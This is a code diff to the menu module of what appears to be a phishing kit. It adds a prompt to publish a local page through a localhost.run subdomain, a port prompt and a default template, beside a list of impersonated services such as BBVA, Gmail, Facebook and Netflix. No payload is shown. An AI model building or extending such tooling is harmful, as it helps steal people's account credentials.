@@ -22,6 +22,16 @@ BANNER = """
               (_.'     \033[0;38;5;160mwe are not responsible for the misuse that may occur.\033[0m
 """
 
+LOCALHOSTRUN = """
+               __
+    ..=====.. |==|          \033[0;38;5;112mExample\033[0m
+    ||     || |= |          \033[0;38;5;112mInput: test\033[0m
+ _  ||     || |^*| _        \033[0;38;5;112mResult: https://test.localhost.run\033[0m
+|=| o=,===,=o |__||=|       \033[0;38;5;112mCompatible con terminales:        Konsole\033[0m
+|_|  _______)~`)  |_|                                         \033[0;38;5;112mxterm\033[0m
+    [=======]  ()                                             \033[0;38;5;112mxfterminal\033[0m
+"""
+
 
 INFO = """
           \033[0;38;5;73m,-.        \033[0;38;5;112mLicence: MIT\033[0m
@@ -46,13 +56,28 @@ INFO = """
 OPTIONS = ['Help','Amino', 'BBVA', 'Chess', 'Disney', 'EpicGames', 'Facebook', 'Gmail',
           'Instagram', 'Lichess', 'Microsoft', 'Netflix', 'Outlook']
 
+# Function:
 def banner():
   try:
     print(BANNER)
-    op = int(input("Option: "))
+    op = int(input("\033[0;38;5;172mOption [Default: Amino]: \033[0m"))
     return OPTIONS[op]
   except:
-    return None
+    return "Amino"
 
-def info():
-  print(INFO)
+# Funciont:
+def port():
+  try:
+    return input('\033[0;38;5;172m\nYour port?: \033[0m')
+  except:
+    return "5000"
+
+# Function: Pendiente
+def localhost_run():
+  print(LOCALHOSTRUN)
+  op = input('\033[0;38;5;172mDo you want to generate a subdomain with localhost.run? y/n: \033[0m')
+
+  if (op == 'y' or op == 'Y'):
+    return input('\033[0;38;5;172m\nEnter name: \033[0m')
+  
+  return None
